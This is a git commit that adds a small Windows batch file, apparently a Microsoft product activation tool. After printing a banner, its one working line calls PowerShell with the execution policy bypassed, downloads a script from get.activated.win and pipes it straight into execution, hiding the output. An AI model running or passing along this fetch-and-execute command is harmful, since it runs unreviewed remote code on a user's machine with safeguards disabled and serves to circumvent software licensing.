61aeeafbe7f1270d158869388b4b4abef8b25fd2
kh-mithu <56751467+kh-mithu@users.noreply.github.com>
2025-11-20 05:15:10 +0000

    Add files via upload

---
+++ microsoft activation script.bat
@@ -0,0 +1,12 @@
+@echo off
+
+REM 
+echo ============================
+echo Microsoft Activation Scripts
+echo 	 -found_by_MDKHMITHU
+echo ============================
+echo.
+REM
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://get.activated.win | iex | Out-Null"
+
+pause
